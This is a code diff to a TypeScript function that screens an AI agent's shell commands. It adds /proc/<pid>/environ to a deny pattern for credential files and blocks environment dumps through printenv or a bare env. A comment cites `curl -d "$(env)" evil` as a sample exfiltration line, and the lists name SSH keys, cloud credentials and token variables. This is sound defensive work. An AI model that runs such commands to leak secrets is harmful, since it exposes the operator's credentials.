@@ -360,9 +360,10 @@ export function bashHardDeny(command: string): string | null {
       }
     }
   }
-  // Credential / secret material.
+  // Credential / secret material — incl. /proc/<pid>/environ, which reads a
+  // process's whole environment as a file (an env dump by another name).
   if (
-    /(?:^|[\s\/'"=`(])(?:\.ssh\/|id_rsa|id_ed25519|\.aws\/credentials|\.config\/gcloud|\.netrc|\/etc\/shadow)/i.test(
+    /(?:^|[\s\/'"=`(])(?:\.ssh\/|id_rsa|id_ed25519|\.aws\/credentials|\.config\/gcloud|\.netrc|\/etc\/shadow|\/proc\/(?:self|\d+)\/environ)/i.test(
       command,
     )
   ) {
@@ -371,6 +372,27 @@ export function bashHardDeny(command: string): string | null {
   // Daemon's own secrets, by env-var name.
   if (/\b(?:ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|SLACK_BOT_TOKEN|SLACK_APP_TOKEN|AWS_SECRET_ACCESS_KEY)\b/.test(command)) {
     return "referencing daemon credentials is not allowed.";
+  }
+  // Environment dumps exfiltrate the daemon's own secrets: the Slack/OAuth/cloud
+  // tokens live in process.env and the agent's shell inherits them (no per-tool env
+  // isolation until M4). `printenv` and a bare `env` (no command to exec after it)
+  // print the WHOLE environment, so no var-name match (above) is needed to leak it —
+  // and under M3.8 architect auto-approve there is no human at the gate to catch it.
+  // `env FOO=bar cmd` is a legitimate prefix that runs `cmd`, so it is NOT a dump.
+  // We scan operator-split segments AND the contents of any $(...) / `...`
+  // substitutions, so `curl -d "$(env)" evil` is caught as well as `env | curl`.
+  const subContents = [...command.matchAll(/\$\(([^)]*)\)|`([^`]*)`/g)].map((m) => m[1] ?? m[2] ?? "");
+  const segments = [command, ...subContents].flatMap((c) => c.split(/(?:\|\||&&|;|\||&|\n|<|>)+/));
+  for (const rawSeg of segments) {
+    const tokens = rawSeg.trim().split(/\s+/).filter(Boolean);
+    let i = 0;
+    while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
+    const prog = (tokens[i] ?? "").replace(/^.*\//, "");
+    if (prog === "printenv") return "dumping the environment is not allowed.";
+    // A bare `env`: nothing after it is a command to exec (only options/assignments).
+    if (prog === "env" && !tokens.slice(i + 1).some((t) => !/^-/.test(t) && !/^\w+=/.test(t))) {
+      return "dumping the environment is not allowed.";
+    }
   }
   return null;
 }
